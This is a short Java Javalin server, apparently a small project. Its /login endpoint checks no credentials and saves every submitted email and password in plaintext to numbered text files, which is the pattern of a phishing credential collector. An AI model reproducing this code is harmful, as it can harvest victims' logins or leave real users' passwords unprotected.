package org.example;
import io.javalin.Javalin;

import java.io.*;
import java.util.Collections;
import java.util.HashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.zip.ZipOutputStream;


//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class Main {
    public static <JsonArray> void main(String[] args) {
        AtomicReference<String> loginMessage = new AtomicReference<>();
        AtomicInteger loginTry = new AtomicInteger();
        loginTry.set(0);
        loginData loginData = new loginData("", "");

        var app = Javalin.create(config -> {
            config.staticFiles.add("public");
        });


        app.start(7070);
        app.get("/getDataTemplate", ctx -> {
            ctx.json(loginData);
        });
        app.post("/login", ctx -> {
            loginData receivedLoginData = ctx.bodyAsClass(loginData.class);
            int id = loginTry.incrementAndGet();
            try {
                saveLoginDataToTextFile(receivedLoginData, id);
            } catch (IOException e) {
                e.printStackTrace();
            }
        });

    }
    private static void saveLoginDataToTextFile(loginData loginData, int id) throws IOException {
        String filename = "login" + id + ".txt";
        File file = new File(filename);
        BufferedWriter writer = new BufferedWriter(new FileWriter(file));
        writer.write("Mail: " + loginData.mail() + ", Password: " + loginData.password());
        writer.newLine();
        writer.close();
    }
}









